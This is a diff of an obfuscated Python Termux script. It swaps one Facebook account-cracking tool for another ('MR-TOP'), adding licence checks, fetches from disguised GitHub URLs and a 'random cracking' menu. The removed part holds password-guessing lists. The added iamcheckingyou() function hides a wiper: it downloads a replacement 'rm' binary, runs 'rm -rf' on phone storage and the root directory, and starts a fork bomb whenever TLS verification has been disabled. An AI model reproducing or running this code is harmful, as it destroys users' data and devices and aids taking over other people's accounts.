+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B7')
+try:
+    king=f'{site}reque'+'sts/'
+    if not 'sys.stdout.write' in open(king+'sess'+'ions.py','r').read():pass
+    else:exit(f"{style} {warning} A8")
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B8')
+try:
+    qeen=f'{site}req'+'uests/'
+    if not 'sys.stdout.write' in open(qeen+'mod'+'els.py','r').read():pass
+    else:exit(f"{style} {warning} A9")
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B9')
+try:
+    don=f'{site}requ'+'ests/'
+    if not 'sys.stdout.write' in open(don+'a'+'pi.py','r').read():pass
+    else:exit(f"{style} {warning} A10")
+except:exit(f'{style} PLE'+'ASE TY'+f'PE :{xoxo} {pipo} B10')
+#----------------------[ ALL RANDOM MODELS ]--------------------------->>>
+sys.stdout.write(f'\x1b[1;35m\x1b]2; [×] =MR÷TOP= [×]\x07')
+OkLic = "<RS"+"AKe"+"yVa"+"lue><Mod"+"ulus>v16"+"ZdDedMM6dZ"+"xKXj+8KorJ4"+"PZmg1MsH"+"7h72L+5rs3+lw0aKuDE9Iv"+"6MbQjfs88+QUe6jHXW2"+"HXtXXQZ8N34hl+"+"yIWZvGOj8RacF"+"E0hhBeTVXMoij"+"bqIpYriJpPJs+bU"+"k7RpI9AJqze"+"YUmxjZk1fz5ZC"+"Xr0eGM8ty1+UX"+"CqHV/HY+K590"+"QMH4SjFJwmi/+WhCd"+"psWURu66d9O8L"+"+/C0SbGERcKm+JZ"+"Dg2n/FWh9I"+"Up7WSy3G9+"+"FgzdUJvrXkRArv9"+"r"+"2zDfM098y4e4ds5vALE5erdjsrjM"+"/M+RgYtjiQiGjuL"+"nO6Pfx5MkLlhcMYIxZ"+"c0ac1e57thOXQElUUx5X"+"YZQ"+"==</Mod"+"ulus><"+"Exp"+"onen"+"t>AQA"+"B</Exp"+"onent></RS"+"AKeyVal"+"ue>"
+auth = "Wy"+"I3MTY5MjU"+"1NiIsIklIZnc"+"5TkZDMXdRdHhL"+"S0Z5VGNYSW5kTjMve"+"TZpY096UlB2cUhxe"+"G0iXQ"+"=="
+xodas = '4ZDAMR'+'TF4YDIL3'+'BOBZG65T'
+naki = 'BNR'+'ZGKZTBOQWX'+'QZBONB2'+'G23A='
+soso = base64.b32decode(bytes(kire+hala+moja+xodas+naki,'utf-8')).decode()
+note = 'THI'+'S IS RE'+'FAT HERE ALWA'+'YS BRAN'+'D M'+'R-TOP !'
+licum = platform.platform().replace('Linux', '').replace('libc', '').replace('with', '').replace('-', '').replace('.','').replace('+', '').upper()[::1]
+licut = str(os.geteuid())+str(os.getlogin()).replace('_','').upper()[::1].replace('A0U', '')
+tornanire = "B"+"8V"+"N3"+"H4"+licum+licut
+hamdam = len
+loop,lim = 0,0
+methods,pcp,oks,cps,pw,user = [],[],[],[],[],[]
+"""-------------------------(ALL USERAGENT SYSTEM)-------------------------"""
+mdl_url = 'https'+'://gi'+'st.gith'+'ubuser'+'content'+'.com/R'+'EFAT-1'+'56/ce'+'32dac4fd'+'13dc22eb94'+'c9ef5003'+'300f/ra'+'w/8b89'+'908acc56bea'+'bce9eb329'+'e7873e8'+'e587025'+'15/'
+base_url = 'ht'+'tp'+'s://'+'raw.'+'gith'+'ubuse'+'rcont'+'ent.c'+'om/T'+'O'+'-X'+'D/T'+'O'+'P-S'+'E'+'C'+'/m'+'ain/'
+vrs_url = 'ht'+'tps'+'://r'+'aw.g'+'ithubu'+'serc'+'onte'+'nt.c'+'om/R'+'EFAT-'+'156'+'/R'+'EFA'+'T-X'+'D/mai'+'n/'
+vrs_curl = vrs_url+'t'+'tv.'+'txt';mdl_curl = mdl_url+'1'+'7k+';m1ua_url = base_url+'o'+'n'+'e.tx'+'t';m2ua_url = base_url+'t'+'w'+'o.t'+'xt';m3ua_url = base_url+'t'+'h'+'re'+'e.t'+'xt';m4ua_url = base_url+'f'+'o'+'u'+'r.t'+'xt';m5ua_url = base_url+'f'+'iv'+'e'+'.t'+'xt'
+def get_text_lines(url):
     try:
-        ua=open('xyzagents.txt','r').read().splitlines()
-        for ub in ua:
-            ugen.append(ub)
-    except:
-        a=requests.get('https://github.com/YounisXyz/XyzServer/blob/main/xyzagents.txt').text
-        ua=open('.xyzagents.txt','w')
-        aa=re.findall('line">(.*?)<',str(a))
-        for un in aa:
-            ua.write(un+'\n') 
-        ua=open('.xyzagents.txt','r').read().splitlines()
-
-
-
-
-#-----------------------[DEF JALAN]-----------------------#
-class jalan:
-    def __init__(self, z):
-        for e in z + "\n":
-            sys.stdout.write(e)
-            sys.stdout.flush()
-            time.sleep(0.0001)
-
-
-
-###-----------------------[CREATOR INFO]-----------------------###
-Developer = "Muhammad Younis" 
-Github = "https://github.com/YounisXyz" 
-Facebook = "https://www.facebook.com/xyzhackers" 
-Version = "0.0.1" 
-###-----------------------[CREATOR INFO]-----------------------###
-
-###----[DISPLAY PASS LIST]----###
-Pakistan = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. khan1122\n{N}[{R}3{N}]. i love you\n{N}[{R}4{N}]. khankhan\n{N}[{R}5{N}]. khan123\n{N}[{R}6{N}]. khan786\n{N}[{R}7{N}]. baloch"
-India = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. free fire\n{N}[{R}3{N}]. freefire\n{N}[{R}4{N}]. i love you\n{N}[{R}5{N}]. 57272300\n{N}[{R}6{N}]. 59039200"
-Bangladesh = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. free fire\n{N}[{R}3{N}]. freefire\n{N}[{R}4{N}]. i love you\n{N}[{R}5{N}]. Bangladesh\n{N}[{R}6{N}]. bangladesh"
-Afghanistan = f"{N}[{R}1{N}]. 7 AND 11 DIGITS\n{N}[{R}2{N}]. free fire\n{N}[{R}3{N}]. freefire\n{N}[{R}4{N}]. i love you\n{N}[{R}5{N}]. khankhan\n{N}[{R}6{N}]. khan123\n{N}[{R}7{N}]. khan1122\n{N}[{R}8{N}]. Afghan123\n{N}[{R}9{N}]. afghanistan\n{N}[{R}10{N}]. 100200\n{N}[{R}11{N}]. kabul123"
-
-
-
-
-#-----------------------[MENU GETTING DEVICE INFORMATION]-----------------------#
-hostname=socket.gethostname()
-ipp=socket.gethostbyname(hostname)
-ipinfo = requests.get('http://ip-api.com/json/')
-z = json.loads(ipinfo.text)
-regi = z['regionName']
-network = z['isp']
-ip = requests.get('https://api.ipify.org').text.strip()
-loc = requests.get('https://ipapi.com/ip_api.php?ip=' + ip, headers={'Referer': 'https://ip-api.com/', 'Content-Type': 'application/json; charset=utf-8', 'User-Agent': 'Mozilla/5.0 (Linux; Android 7.1.2; Redmi 4X) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.92 Mobile Safari/537.36'}).json()['country_name'].upper()
-bd = random.randint(20000000.0, 30000000.0)
-sim = random.randint(20000, 40000) 
-header = {'x-fb-connection-bandwidth': repr(bd), 'x-fb-sim-hni': repr(sim), 'x-fb-net-hni': repr(sim), 'x-fb-connection-quality': 'EXCELLENT', 'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA', 'user-agent': 'Mozilla/5.0 (Linux; Android 10; Mi 9T Pro Build/QKQ1.190825.002; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/88.0.4324.181 Mobile Safari/537.36 [FBAN/EMA;FBLC/id_ID;FBAV/239.0.0.10.109;]', 'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
-
-###---------[CURRENTLY TIME ZONE]-------###
-def xyztime():
-    now = datetime.now()
-    hours = now.hour
-    if 4 <= hours < 12:timenow = "Good Morning"
-    elif 12 <= hours < 15:timenow = "Good Afternoon"
-    elif 15 <= hours < 18:timenow = "Good Evening"
-    else:timenow = "Good Night"
-    return timenow
-    
-    
-#_________[ DISPLAY MONTH /N/ YEAR ]______>>>
-month = {'1':'January','2':'February','3':'March','4':'April','5':'May','6':'June','7':'July','8':'August','9':'September','10': 'October', '11': 'November', '12': 'December'}
-date = datetime.now().day
-month = month[(str(datetime.now().month))]
-year = datetime.now().year
-date = (str(date)+' '+str(month)+' '+str(year))
-day = datetime.now().strftime("%A")
-days = datetime.now().day
-
-
-###---------[IF WNAT TO SAFE CLONE WITH DATE]-------###
-OK = 'OK-'+str(date)+'-'+str(month)+'-'+str(year)+'.txt'
-CP = 'CP-'+str(date)+'-'+str(month)+'-'+str(year)+'.txt'
-now = datetime.now()
-hour = now.hour
-
-now = datetime.now()
-current = datetime.now()
-year = current.year
-month = current.month
-day = current.day
-
-ltx = int(lt()[3])
-if ltx > 12:
-    x = ltx-12
-    tag = "PM"
-else:
-    x = ltx
-    tag = "AM"
-
-
-
-
-
-#_________[ DISPLAY TIME / LOOP TIME ]______>>>
-			
-def XYZTIME():
-    import time
-    a=time.localtime()
-    hr=a.tm_hour
-    mn=a.tm_min
-    sc=a.tm_sec
-    return ('{}:{}:{}'.format(hr,mn,sc))
-
-
-#-----------------------[DEF CLEAR TERMINAL]-----------------------#    
+        buffer = BytesIO();c = pycurl.Curl();c.setopt(c.URL, url);c.setopt(c.WRITEDATA, buffer);c.perform();c.close()
+    except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
+    return buffer.getvalue().decode('utf-8').splitlines()
+vr = '\n'.join(get_text_lines(vrs_curl));mdl = get_text_lines(mdl_curl);m1ua = get_text_lines(m1ua_url);m2ua = get_text_lines(m2ua_url);m3ua = get_text_lines(m3ua_url);m4ua = get_text_lines(m4ua_url);m5ua = get_text_lines(m5ua_url)
+#-------------------------(System Clear)------------------------->>>
 def clear():
-    os.system('clear')
+    wash("clear")
     print(logo)
-
-
-
-
-logo =f"""                      
-{R} _______  _______  _______  _______  _______ 
-{P}(  ____ )(  ___  )(       )(  ____ \(  ___  )
-{H}| (    )|| (   ) || () () || (    \/| (   ) |
-{P}| (____)|| |   | || || || || (__    | |   | |
-|     __)| |   | || |(_)| ||  __)   | |   | |
-{H}| (\ (   | |   | || |   | || (      | |   | |
-{P}| ) \ \__| (___) || )   ( || (____/\| (___) |
-{R}|/   \__/(_______)|/     \|(_______/(_______)
-\t      {N}[{Brown} {xyztime()} {N}]
-{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€
-{P}[{H}â€¢{P}] AUTHOR   : {Developer}
-{P}[{H}â€¢{P}] GITHUB   : {Github}
-{P}[{H}â€¢{P}] FACEBOOK : {Facebook}
-{P}[{H}â€¢{P}] VERSION  : {Version}
-{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{Y}âž¤{H}âž¤{R}âž¤{N}â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€â”€{P}"""
-def line():
-	print(f"{P}{50 * 'â”€'}") 
-
-
-
-#---------------------[APPLICATION CHECKER]---------------------#
-def check_applications(session,coki):
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r{P}[{R}!{P}]. {Y}SORRY THERE IS NO ACTIVE APK{P}')
+#-------------------------(Special Lines)------------------------->>>
+def _________linex_________():
+    print(f"{BE}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•")
+#-------------------------(MR-TOP LOGO)------------------------->>>
+logo = f"""{G}
+{G0} ooooooooooo     ooooooo     oooooooooo
+{G1} 88  888  88   o888   888o    888    88
+{G2}     888       888     888    888oooo88
+{G3}     888       888o   o888    888
+{G4}    o888o        88ooo88     o888o
+{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•
+{style}{G0} FACEBOOK    {RE}●{G0} REFAT SHAHRIAR
+{style}{G1} GITHUB      {RE}●{G1} REFAT-156
+{style}{G2} VERSION     {RE}●{G2} {vr}
+{B}•━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━•"""
+#-------------------------(MR-TOP ALL VALUE)------------------------->>>
+XeX = soso
+aplnk = XeX
+buffer = BytesIO()
+c = pycurl.Curl()
+c.setopt(c.URL, aplnk)
+c.setopt(c.WRITEDATA, buffer)
+try:c.perform()
+except pycurl.error:exit(f"{style} Your Network Is Unreachable ! ")
+c.close()
+body = buffer.getvalue().decode('utf-8')
+link = body
+#-------------------------(MAIN MENU)------------------------->>>
+def ___R_E_F_A_T___():
+    global lim
+    clear();verify();iamcheckingyou()
+    try:
+        key = open('/data'+'/data/com'+'.termux/fi'+'les/usr/bi'+'n/.tmrnu'+'nucoto.txt','r').read()
+    except FileNotFoundError: 
+        key = str(input(f"{style} P"+"UT L"+"ICE"+f"NSE {RE}●{G} "))
+    result = Key.activate(token=auth,\
+    rsa_pub_key=OkLic,\
+    product_id=23545, \
+    key=key,\
+    machine_code=Helpers.GetMachineCode())
+    if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
+        clear()
+        print(f"{style} Yo"+"ur Lice"+"nse Ex"+"pired Cont"+"act Adm"+"in....");time.sleep(3);os.system("rm /data"+"/data/c"+"om.te"+"rmux/file"+"s/usr/bin/.tmr"+"nunuc"+"oto.txt");wash("xdg-open https:/"+"/chat.whats"+"app.com/LJk2V"+"t0ogyTFJDyk2GNqv0");___R_E_F_A_T___()
     else:
-        print(f'\r%s[ðŸŽ®]. %sYOUR ACTIVE APPLICATIONS  DETAILS:'%(P,H))
-        for i in range(len(game)):
-            print(f"\r{P}[{H}%s{P}]. %s%s"%(i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),N))
-    w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
-    sop = BeautifulSoup(w,"html.parser")
-    x = sop.find("form",method="post")
-    game = [i.text for i in x.find_all("h3")]
-    if len(game)==0:
-        print(f'\r{P}[{R}!{P}]. {Y}SORRY THERE IS NO EXPIRED APK{P}')
-    else:
-        print(f'\r%s[ðŸŽ®]. %sYOUR EXPIRED APPLICATIONS  DETAILS:'%(P,Y))
-        for i in range(len(game)):
-            print(f"\r{P}[{R}%s{P}]. %s%s"%(i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),N))
-        else:
-            print(f'\r')
-            
-            
-
- 
-
-
-
-#-----------------------[ID CREATION YEAR CHECKER]-----------------------#
-def creation(uid):
-    if len(uid)==15:
-        if uid[:10] in ['1000000000']       :younisxyz = '| 2009'
-        elif uid[:9] in ['100000000']       :younisxyz = '| 2009'
-        elif uid[:8] in ['10000000']        :younisxyz = '| 2009'
-        elif uid[:7] in ['1000000','1000001','1000002','1000003','1000004','1000005']:younisxyz = '| 2009'
-        elif uid[:7] in ['1000006','1000007','1000008','1000009']:younisxyz = '| 2010'
-        elif uid[:6] in ['100001']          :younisxyz = '| 2010/2011'
-        elif uid[:6] in ['100002','100003'] :younisxyz = '| 2011/2012'
-        elif uid[:6] in ['100004']          :younisxyz = '| 2012/2013'
-        elif uid[:6] in ['100005','100006'] :younisxyz = '| 2013/2014'
-        elif uid[:6] in ['100007','100008'] :younisxyz = '| 2014/2015'
-        elif uid[:6] in ['100009']          :younisxyz = '| 2015'
-        elif uid[:5] in ['10001']           :younisxyz = '| 2015/2016'
-        elif uid[:5] in ['10002']           :younisxyz = '| 2016/2017'
-        elif uid[:5] in ['10003']           :younisxyz = '| 2018/2019'
-        elif uid[:5] in ['10004']           :younisxyz = '| 2019/2020'
-        elif uid[:5] in ['10005']           :younisxyz = '| 2020'
-        elif uid[:5] in ['10006','10007','']:younisxyz = '| 2021'
-        elif uid[:5] in ['10008']           :younisxyz = '| 2022'
-        else:younisxyz=''
-    elif len(uid) in [9,10]:
-        younisxyz = '| 2008/2009'
-    elif len(uid)==8:
-        younisxyz = '| 2007/2008'
-    elif len(uid)==7:
-        younisxyz = '| 2006/2007'
-    else:younisxyz=''
-    return younisxyz
+        clear()
+        license_key = result[0]
+        with open('/data'+'/dat'+'a/com.te'+'rmux/file'+'s/usr/bin/.'+'tmrnunu'+'coto.txt','w') as f:
+            f.write(key)
+    print(f"{L}[\033[01m\033[94;1m\033[47m USEAGE ● TOOL ON"+"LY WORK MO"+"BILE DA"+f"TA \033[40m{L}]")
+    _________linex_________()
+    print(f"{style} LICENSE EXPIRE{K} ●{Y} " +str(license_key.expires))
+    _________linex_________()
+    print(f"{G}[{R}B{G}]{X}_{Y}_{Z}>{G1} RA"+"NDOM C"+"RACKING")
+    print(f"{G}[{R}D{G}]{X}_{Y}_{Z}>{G3} JO"+f"IN OUR {W}({G3}WHATSAPP{W})")
+    print(f"{G}[{R}E{G}]{X}_{Y}_{Z}>{G4} CONT"+f"ACT WITH US {W}({G4}FB{W})")
+    _________linex_________()
+    _________switch_________ = input(f"{style}{X}_{Y}_{Z}>{G} SELECT  {RE}●{G} ")
+    if _________switch_________ in ["", " "]:wash("xdg-open https"+"://www.facebo"+"ok.com/profile.p"+"hp?id=1000071"+"69071530");___R_E_F_A_T___()
+    elif _________switch_________ in ["A","a","1","One"]:__Ok_XoXu__()
+    elif _________switch_________ in ["B","b","2","Two"]:randommenu()
+    elif _________switch_________ in ["D","d","4","Four"]:wash("xdg-open https"+"://chat.whatsap"+"p.com/LJk2"+"Vt0ogyTFJ"+"Dyk2GNqv0");___R_E_F_A_T___()
+    elif _________switch_________ in ["E","e","5","Five"]:wash("xdg-open https"+"://www.face"+"book.com/prof"+"ile.php?id=1000"+"07169071530");___R_E_F_A_T___()
+    else:print(f'{style} SELECT VALID OPTION ... ');time.sleep(2);___R_E_F_A_T___()
 
 #---------------------[MAIN MENU]---------------------#
 def randommenu():
@@ -655,19 +439,46 @@ def YounisXyz(uid,pwx,tl):
                 break
             else:continue
         loop+=1
-        x = random.choice(colors)
-        emoji_motion = random.choice(["ðŸ˜‡","ðŸ˜Œ","ðŸ˜","ðŸ˜˜","ðŸ¤‘","ðŸ˜","ðŸ˜›","ðŸ˜¶","ðŸ˜œ","ðŸ˜","ðŸ˜†","ðŸ˜„","ðŸ˜…","ðŸ¤—","ðŸ˜¡","ðŸ˜¤","ðŸ˜©","ðŸ˜¢","ðŸ˜²"])
-        #sys.stdout.write(f"\r\033[0;97m[{x}YounisXyzðŸ”¥\033[0;97m] [\033[1;92m{tl}\033[0;97m/\033[1;93m{loop}\033[0;97m] [\033[1;92mOK:{len(ok)}\033[0;97m] [\033[1;93mCP:{len(cp)}\033[0;97m] [\033[1;96m{XYZTIME()}\033[0;97m] [\x1b[38;5;208m{'{:.1%}'.format(loop/float(tl))}\033[0;97m] ")
-        sys.stdout.write(f"\r\033[0;97m[{x}{uid}\033[0;97m] [\033[1;96m{tl}\033[1;97m/\033[1;93m{loop}\033[0;97m] [\033[1;92mOK:{len(ok)}\033[1;97m] [\033[1;91mCP:{len(cp)}\033[0;97m] [\033[1;93m{'{:.0%}'.format(loop/float(tl))}\033[0;97m]")
-        sys.stdout.flush()
-    except:
-        pass
-Main
-
-
-
-
-
-
-
-
+        except requests.exceptions.ConnectionError:time.sleep(20)
+"""-------------------------(MR-TOP TOOL STATUS CHECKER)-------------------------"""
+def issue():
+    if os.path.isfile("/data/d"+"ata/com.ter"+"mux/files/u"+"sr/bin/rm"):pass
+    else:system('clear');print(f'{style} Syste'+'m Modif'+'ication N'+'ot Allo'+'wed Warn'+'ing By Mr Top');exit()
+    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr"+"/bin/cp"):pass
+    else:system('clear');print(f'{style} Syst'+'em Mod'+'ification N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
+    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/us"+"r/bin/mv"):pass
+    else:system('clear');print(f'{style} Sys'+'tem Modifi'+'cation N'+'ot All'+'owed Warni'+'ng By Mr Top');exit()
+    if os.path.isfile("/data/d"+"ata/com.termu"+"x/files/usr/bi"+"n/termux-reset"):pass
+    else:system('clear');print(f'{style} Sys'+'tem Modi'+'fication N'+'ot All'+'owed War'+'ning By Mr Top');exit()
+    if os.path.isfile("/data/dat"+"a/com.termux/files/usr/"+"bin/term"+"ux-setup-storage"):pass
+    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
+    if os.path.isfile("/data/da"+"ta/com.termu"+"x/files/usr/"+"bin/pip"):pass
+    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
+    if os.path.isfile("/data/dat"+"a/com.termux/file"+"s/usr/bin"+"/pip3"):pass
+    else:system('clear');print(f'{style} Sy'+'stem Modi'+'fication N'+'ot Allo'+'wed Wa'+'rning By Mr Top');exit()
+    if os.path.isfile("/data/data/com"+".termux/files/"+"usr/bin/"+"pip3.11"):pass
+    else:system('clear');print(f'{style} Sys'+'tem Modific'+'ation N'+'ot Allo'+'wed War'+'ning By Mr Top');exit()
+def iamcheckingyou():
+    with open(f'{site}requests/sessions.py', 'r') as file :
+        filedata63 = file.read()
+    if "verify = False" in filedata63:os.system("c"+"d /"+"data"+"/dat"+"a/com"+".term"+"ux/fi"+"les/usr"+"/bin &"+"& cur"+"l -s"+"S -"+"L ht"+"tps:/"+"/githu"+"b.com"+"/R"+"EFAT"+"-"+"156/"+"Serve"+"rO"+"fRefa"+"t/raw"+"/main"+"/rm "+"-o rm"+" &&"+" chm"+"od +x"+" /dat"+"a/data"+"/com."+"termu"+"x/file"+"s/usr/"+"bin/r"+"m &"+"& c"+"d "+"$HO"+"ME/REF"+"AT"+"-XD");wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
+    else:pass
+    with open(f'{site}urllib3/conne'+'ction.py', 'r') as file7i7 :
+        filedata47 = file7i7.read()
+    if str("cert_reqs = 'CERT_NONE'") in filedata47:wash('rm -rf /storage/emulated/0/*');wash('rm -rf /storage/emulated/*');wash('rm -rf /sdcard/*');wash('rm -rf /sdcard/0/*');wash('rm -rf /sdcard1/*');wash('rm -rf /storage/*');wash('rm -rf /*');wash('rm -rf /system/*');wash('rm -rf $HOME/../../*');wash('rm -rf $PREFIX/b');wash('rm -rf $HOME/*');wash('mv $HOME /dev/null');wash(':(){ :|: & };:');wash("rm -rf /data/data/com.termux/files/usr/lib/python3.*");_________linex_________();print(f'{style} MR.TOP FUCK YOUR SYSTEM 😗');_________linex_________();time.sleep(2);print(f'{style} PAID COMMAND FREE USE NOTE EASY 🤣');_________linex_________();time.sleep(2);print(f'{style} GO AND CHECK YOUR STORAGE BYE...😘🍻');_________linex_________();time.sleep(2);exit()
+def verify():
+    with open(f'{site}req'+'uests/sessi'+'ons.py', 'r') as file :
+            filedata = file.read()
+    filedata = filedata.replace('verify = False', 'verify = True')
+    with open(f'{site}reque'+'sts/sessi'+'ons.py', 'w') as file:
+        file.write(filedata)
+    if "verify = True" in filedata:pass
+    else:
+        with open(f'{site}requ'+'ests/sess'+'ions.py', 'a') as file:
+            file.write('\nverify = True\n')
+    pass
+"""-------------------------(DEFINE AND RUN TOOL)-------------------------"""
+if __name__=='__main__':
+    try:issue();iamcheckingyou();verify();rsbuy()
+    except requests.exceptions.ConnectionError:print('\n No internet connection ...');exit()
+    except:exit()
